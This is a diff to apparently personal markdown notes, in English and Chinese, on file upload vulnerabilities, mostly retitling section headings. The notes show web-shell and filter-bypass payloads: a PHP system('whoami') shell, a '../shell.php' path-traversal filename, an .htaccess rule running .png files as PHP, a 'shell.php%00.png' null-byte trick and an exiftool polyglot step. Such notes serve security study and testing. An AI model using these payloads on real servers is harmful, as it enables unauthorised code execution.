@@ -14,15 +14,15 @@ In some cases, the act of uploading the file is in itself enough to cause damage
 
 ## 2. Test
 
-### 2.1. Web Shell Upload
+### 2.1. Web Shell
 
 使用以下命令避免对目标造成危害
 
 ```
-<?php echo exec('whoami'); ?>
+<?php system('whoami'); ?>
 ```
 
-### 2.2. Content-Type Restriction Bypass
+### 2.2. Content-Type Restriction
 
 伪造 MIME 类型绕过校验
 
@@ -44,7 +44,7 @@ Content-Disposition: form-data; name="avatar"; filename="../shell.php"
 
 > 若返回 `The file avatars/shell.php has been uploaded.` 则需要将 `../` 编码绕过
 
-### 2.4. Extension Blacklist Bypass
+### 2.4. Extension Blacklist
 
 若 Apache 无法上传 PHP 文件, 可创建一个 `.htaccess` 将 `.png` 文件以 PHP 的方式解析
 
@@ -54,7 +54,7 @@ AddType application/x-httpd-php .png
 
 ### 2.5. Obfuscated File Extension
 
-目标仅允许特定的扩展名, 可通过 00 截断混淆扩展名
+目标仅允许特定的扩展名, 可通过 00 截断混淆
 
 ```
 filename="shell.php%00.png"
@@ -64,7 +64,7 @@ filename="shell.php%00.png"
 
 > 文件上传到服务器后, `shell.php%00.png` 会自动修改为 `shell.php` 
 
-### 2.6. Polyglot Web Shell Upload
+### 2.6. Polyglot Web Shell
 
 目标会校验文件内容是否为图片, 可使用 exiftool 生成一个含有图片内容的 PHP 文件
 
@@ -106,7 +106,7 @@ def handleResponse(req, interesting):
 
 ---
 
-Refrences
+**References**
 
 - [File upload vulnerabilities](https://portswigger.net/web-security/file-upload)
 - [CWE-434](https://hackerone.com/hacktivity/cwe_discovery?id=cwe-434)
